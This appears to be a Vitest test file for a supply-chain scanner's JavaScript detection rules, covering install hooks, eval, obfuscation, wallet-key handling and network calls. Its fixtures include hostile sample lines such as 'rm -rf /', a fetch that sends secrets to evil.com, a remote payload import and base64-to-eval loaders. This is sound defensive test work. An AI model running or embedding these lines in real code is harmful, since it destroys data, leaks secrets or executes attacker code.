/**
 * Tests for JavaScript / TypeScript detection rules
 * Covers install hooks, code execution, wallet patterns, obfuscation, network
 */

import { describe, it, expect } from 'vitest';
import { applyRule, matchFile } from '../../src/scanner/matcher';
import { javascriptRules } from '../../src/rules/javascript-rules';

function getRule(id: string) {
  const rule = javascriptRules.find((r) => r.id === id);
  if (!rule) throw new Error(`Rule not found: ${id}`);
  return rule;
}

function expectDetection(id: string, filePath: string, content: string) {
  const rule = getRule(id);
  expect(matchFile(filePath, rule.filePatterns)).toBe(true);
  const findings = applyRule(rule, filePath, content);
  expect(findings.length).toBeGreaterThan(0);
  return findings;
}

function expectNoDetection(id: string, filePath: string, content: string) {
  const rule = getRule(id);
  if (!matchFile(filePath, rule.filePatterns)) return;
  const findings = applyRule(rule, filePath, content);
  expect(findings).toHaveLength(0);
}

// ============================================
// Install hooks
// ============================================

describe('js-postinstall-script', () => {
  it('detects postinstall in package.json', () => {
    expectDetection(
      'js-postinstall-script',
      'package.json',
      `{ "scripts": { "postinstall": "node setup.js" } }`
    );
  });

  it('does not flag start script', () => {
    expectNoDetection(
      'js-postinstall-script',
      'package.json',
      `{ "scripts": { "start": "node index.js" } }`
    );
  });
});

describe('js-preinstall-script', () => {
  it('detects preinstall in package.json', () => {
    expectDetection(
      'js-preinstall-script',
      'package.json',
      `{ "scripts": { "preinstall": "node setup.js" } }`
    );
  });
});

describe('js-prepare-script', () => {
  it('detects prepare in package.json', () => {
    expectDetection(
      'js-prepare-script',
      'package.json',
      `{ "scripts": { "prepare": "husky install" } }`
    );
  });
});

// ============================================
// Code execution
// ============================================

describe('js-child-process-exec', () => {
  it('detects require child_process', () => {
    expectDetection(
      'js-child-process-exec',
      'index.js',
      `const cp = require('child_process'); cp.exec('ls');`
    );
  });

  it('detects import from child_process', () => {
    expectDetection(
      'js-child-process-exec',
      'index.ts',
      `import { exec } from 'child_process'; exec('ls');`
    );
  });

  it('detects execSync call', () => {
    expectDetection(
      'js-child-process-exec',
      'build.js',
      `execSync('rm -rf /');`
    );
  });

  it('does not flag unrelated code', () => {
    expectNoDetection(
      'js-child-process-exec',
      'app.js',
      `const result = calculate(42);`
    );
  });
});

describe('js-eval-usage', () => {
  it('detects eval()', () => {
    expectDetection('js-eval-usage', 'bad.js', 'eval("malicious code")');
  });

  it('detects Function()', () => {
    expectDetection('js-eval-usage', 'bad.js', 'new Function("return 1")()');
  });

  it('does not flag evaluate method', () => {
    // "evaluate" does not match \beval\s*\( because of word boundary
    expectNoDetection('js-eval-usage', 'good.js', 'page.evaluate(() => {})');
  });
});

describe('js-dynamic-import-url', () => {
  it('detects import from http URL', () => {
    expectDetection(
      'js-dynamic-import-url',
      'loader.js',
      `const mod = await import("https://evil.com/payload.js");`
    );
  });

  it('does not flag local import', () => {
    expectNoDetection(
      'js-dynamic-import-url',
      'loader.js',
      `const mod = await import("./utils");`
    );
  });
});

// ============================================
// Wallet / Web3 patterns
// ============================================

describe('js-wallet-signing', () => {
  it('detects eth_sign', () => {
    expectDetection(
      'js-wallet-signing',
      'dapp.js',
      `provider.request({ method: 'eth_sign', params: [account, data] });`
    );
  });

  it('detects personal_sign', () => {
    expectDetection(
      'js-wallet-signing',
      'dapp.ts',
      `await provider.request({ method: 'personal_sign' });`
    );
  });

  it('detects signTransaction', () => {
    expectDetection(
      'js-wallet-signing',
      'tx.js',
      `wallet.signTransaction(tx);`
    );
  });
});

describe('js-unlimited-approval', () => {
  it('detects approve with MaxUint256', () => {
    expectDetection(
      'js-unlimited-approval',
      'token.js',
      `await contract.approve(spender, ethers.constants.MaxUint256);`
    );
  });

  it('detects setApprovalForAll with MAX_UINT', () => {
    expectDetection(
      'js-unlimited-approval',
      'nft.js',
      `contract.setApprovalForAll(operator, MAX_UINT);`
    );
  });
});

describe('js-private-key-handling', () => {
  it('detects privateKey variable', () => {
    expectDetection(
      'js-private-key-handling',
      'wallet.js',
      `const privateKey = process.env.PRIVATE_KEY;`
    );
  });

  it('detects mnemonic', () => {
    expectDetection(
      'js-private-key-handling',
      'wallet.ts',
      `const mnemonic = "abandon abandon abandon...";`
    );
  });

  it('detects seedPhrase', () => {
    expectDetection(
      'js-private-key-handling',
      'wallet.js',
      `const seedPhrase = getSeedFromUser();`
    );
  });
});

describe('js-rpc-override', () => {
  it('detects JsonRpcProvider with http', () => {
    expectDetection(
      'js-rpc-override',
      'provider.ts',
      `const provider = new JsonRpcProvider("http://evil-rpc.com");`
    );
  });

  it('detects createPublicClient with http', () => {
    expectDetection(
      'js-rpc-override',
      'client.ts',
      `const client = createPublicClient({ transport: http("http://evil.com") });`
    );
  });
});

// ============================================
// Obfuscation
// ============================================

describe('js-obfuscated-code', () => {
  it('detects hex escape sequences', () => {
    expectDetection(
      'js-obfuscated-code',
      'payload.js',
      `var x = "\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f";`
    );
  });

  it('detects _0x variable pattern', () => {
    expectDetection(
      'js-obfuscated-code',
      'obf.js',
      `var _0x4a2b = ['curl', 'http://evil.com'];`
    );
  });

  it('does not flag normal code', () => {
    expectNoDetection(
      'js-obfuscated-code',
      'clean.js',
      `const greeting = "hello world";\nconsole.log(greeting);`
    );
  });
});

describe('js-base64-decode', () => {
  it('detects Buffer.from base64 followed by eval on same statement', () => {
    // Pattern: (atob|Buffer\.from)\s*\([^)]+['"]base64['"])\)[^;]*(eval|Function|require|import)
    // Requires base64 inside parens AND eval/require before the next semicolon
    expectDetection(
      'js-base64-decode',
      'loader.js',
      `Buffer.from("cGF5bG9hZA==", "base64").toString() + eval(x)`
    );
  });

  it('detects Buffer.from base64 with Function on same expression', () => {
    // Pattern: (atob|Buffer\.from)\s*\([^)]+['"]base64['"])\)[^;]*(eval|Function|require|import)
    // [^;]* means eval/Function must appear before the next semicolon
    expectDetection(
      'js-base64-decode',
      'loader.js',
      `var x = Buffer.from(payload, 'base64').toString(), y = Function(x)`
    );
  });
});

// ============================================
// Network
// ============================================

describe('js-fetch-unknown-endpoint', () => {
  it('detects fetch to external URL', () => {
    expectDetection(
      'js-fetch-unknown-endpoint',
      'exfil.js',
      `fetch("https://evil.com/steal?data=" + secrets);`
    );
  });

  it('detects axios to external URL', () => {
    expectDetection(
      'js-fetch-unknown-endpoint',
      'exfil.js',
      `axios("https://evil.com/api");`
    );
  });

  it('does not flag localhost requests', () => {
    expectNoDetection(
      'js-fetch-unknown-endpoint',
      'api.js',
      `fetch("http://localhost:3000/api/data");`
    );
  });
});
